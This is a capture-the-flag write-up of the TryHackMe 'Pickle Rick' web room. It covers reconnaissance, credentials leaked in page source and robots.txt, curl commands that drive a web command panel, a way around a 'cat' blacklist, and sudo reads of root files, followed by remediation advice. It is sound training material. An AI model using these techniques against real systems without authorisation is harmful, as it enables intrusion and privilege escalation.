# Pickle Rick — TryHackMe Writeup

> **Room:** [Pickle Rick](https://tryhackme.com/room/picklerick) · **Difficulty:** Easy
> **Category:** Web · **Author of writeup:** 0xnyx
> **Goal:** Exploit a web server and find three ingredients to turn Rick back into a human.

> ⚠️ In line with TryHackMe's write-up policy, **no flags, passwords, or ingredient values are included** — only the methodology.

---

## 1. Reconnaissance

```bash
nmap -sVC -T4 -Pn <TARGET>
```

- **22/tcp** — OpenSSH
- **80/tcp** — Apache (title: *Rick is sup4r cool*)

## 2. Web enumeration

The home page source and `robots.txt` leak credentials:

```bash
curl -s http://<TARGET>/ | grep -iE 'username|rick|note'
curl -s http://<TARGET>/robots.txt
```

- A **username** is left in an HTML comment ("Note to self, remember username!").
- `robots.txt` contains a single word that turns out to be the **password**.

Directory brute force finds the login and portal:

```bash
gobuster dir -u http://<TARGET>/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
# login.php, portal.php, assets/, denied.php
```

## 3. Foothold — authenticated command panel

The login form POSTs three fields — `username`, `password`, **and the submit button name `sub`**. Omitting `sub` makes the login fail, a common gotcha:

```bash
curl -s -c cookies.txt \
  -d "username=<USER>&password=<PASS>&sub=Login" \
  http://<TARGET>/login.php
```

`portal.php` exposes a **Command Panel** that runs arbitrary commands (`command` + `sub`):

```bash
curl -s -b cookies.txt --data-urlencode "command=ls -la" -d "sub=Execute" \
  http://<TARGET>/portal.php
```

## 4. Finding the ingredients

Listing the web root reveals the first ingredient file plus a `clue.txt`. Note that **`cat` is blacklisted** — use an alternative reader:

```bash
# cat is blocked, so use less / more / tail / strings
command=less Sup3rS3cretPickl3Ingred.txt
```

`clue.txt` says to look around the filesystem. The second ingredient lives in `/home/rick/` (filename contains a space, so quote it):

```bash
command=less "/home/rick/second ingredients"
```

## 5. Privilege escalation → third ingredient

`sudo -l` shows the web user may run **anything as root without a password**:

```
(ALL) NOPASSWD: ALL
```

So the last ingredient in `/root/` is read directly:

```bash
command=sudo ls -la /root
command=sudo less /root/3rd.txt
```

All three ingredients recovered — room complete.

---

## Lessons

- Always read page **source comments** and `robots.txt` first — classic credential leaks.
- Watch for **required form fields** beyond the obvious (the submit-button name here).
- Command-injection blacklists are often incomplete — `cat` blocked ≠ `less`/`more`/`tail`/`strings` blocked.
- `sudo -l` is the first privesc check; `NOPASSWD: ALL` is instant root.

## Remediation

- Never store credentials in source comments or `robots.txt`.
- Don't expose a command-execution feature to users; if unavoidable, use strict allow-lists, not blacklists.
- Remove overly-permissive `sudo` rules (`NOPASSWD: ALL`).

---

*Write-up for [TryHackMe — Pickle Rick](https://tryhackme.com/room/picklerick).*
